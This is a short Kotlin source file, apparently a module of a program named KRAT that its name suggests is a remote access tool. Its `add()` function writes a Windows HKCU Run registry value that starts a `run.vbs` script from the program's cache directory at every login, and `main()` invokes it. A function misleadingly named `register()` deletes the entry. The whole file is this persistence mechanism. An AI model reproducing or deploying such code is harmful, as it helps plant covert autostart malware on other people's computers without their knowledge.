package services

object StartupRegistry {
    fun register() {
        // Delete the registry entry
        val deleteProcess = ProcessBuilder("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "KRAT", "/f")
            .inheritIO()
            .start()
        deleteProcess.waitFor()}

    fun add() {
        ProcessBuilder("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "KRAT", "/t", "REG_SZ", "/d", "${KRAT.cacheDir.absolutePath}\\run.vbs", "/f")
            .inheritIO()
            .start()
            .apply { waitFor() }
    }
}

fun main() {
    StartupRegistry.add()
}